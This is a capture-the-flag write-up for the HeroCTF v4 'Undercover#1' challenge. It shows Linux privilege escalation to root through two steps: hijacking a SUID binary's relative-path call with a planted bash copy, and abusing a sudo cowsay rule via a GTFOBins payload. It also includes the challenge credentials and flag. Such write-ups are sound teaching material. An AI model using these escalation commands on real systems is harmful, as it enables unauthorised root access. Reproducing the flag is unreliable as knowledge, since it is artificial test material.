# HeroCTF v4

## System

### Undercover#1

**Difficulty:** Easy

**Statement:** You have been recruited by the CEO of Hero & Co. to test their security. But before handing you out the assignement, the asked you have to prove yourself, and escalate your privileges on this test system all the way to root.

The base credentials are: `user1:password123`

***

Once connected to the env with the default credentials, I start by listing the files in the home directory :

```
# user1@d9551dfad93a:~$ ls -alh
total 928K
drwxr-xr-x 1 user1 user1 4.0K May 28 08:24 .
drwxr-xr-x 1 root  root  4.0K May 28 02:58 ..
lrwxrwxrwx 1 root  root     9 May 28 02:58 .bash_history -> /dev/null
-rw-r--r-- 1 user1 user1  220 May 28 02:58 .bash_logout
-rw-r--r-- 1 user1 user1 3.7K May 28 02:58 .bashrc
drwx------ 2 user1 user1 4.0K May 28 08:22 .cache
-rw-r--r-- 1 user1 user1  807 May 28 02:58 .profile
-rw-rw-r-- 1 user1 user1  165 May 28 08:24 .wget-hsts
-rwsr-sr-x 1 user2 user2 894K May 28 02:51 hmmm
```

We can see that user1 can execute the SUID binary **hmmm** owned by user2.

So I run the binary to see what happens :

```
# user1@d9551dfad93a:~$ ./hmmm
Not sure why, but I'm gonna set my ruid to my uid.
Not sure why, but I'm gonna run the 'WTFFFFF' program right now.
sh: 1: ./WTFFFFF: not found
```

We can see that the binary tries to execute the `./WTFFFFF` file with the relative path.

So I decide to copy `/bin/bash` in the home, rename it **WTFFFFF** and execute it to privesc to user2 :

```
# user1@d9551dfad93a:~$ cp /bin/bash ./WTFFFFF
# user1@d9551dfad93a:~$ ./hmmm
Not sure why, but I'm gonna set my ruid to my uid.
Not sure why, but I'm gonna run the 'WTFFFFF' program right now.
# user2@d9551dfad93a:~$ id
uid=1001(user2) gid=1000(user1) groups=1000(user1)
```

Once on the user2 shell, I list the authorized commands in `/etc/sudoers` :

```
# user2@d9551dfad93a:/home/user2$ sudo -l
Matching Defaults entries for user2 on d9551dfad93a:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user2 may run the following commands on d9551dfad93a:
    (root) NOPASSWD: /usr/games/cowsay
```

I go to GTFOBins and I see that it is possible to privesc with the binary cowsay: https://gtfobins.github.io/gtfobins/cowsay/

I just have to reproduce the PoC :

```
# user2@d9551dfad93a:/tmp$ TF=$(mktemp)
# user2@d9551dfad93a:/tmp$ echo 'exec "/bin/bash";' >$TF
# user2@d9551dfad93a:/tmp$ sudo /usr/games/cowsay -f $TF x
# root@d9551dfad93a:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```
Now root, I can cat the flag in `/root` :

```
# root@d9551dfad93a:/tmp# cat /root/flag.txt	
Hero{B4ck_2_b4s1cs}
```

Flag: Hero{B4ck_2_b4s1cs}
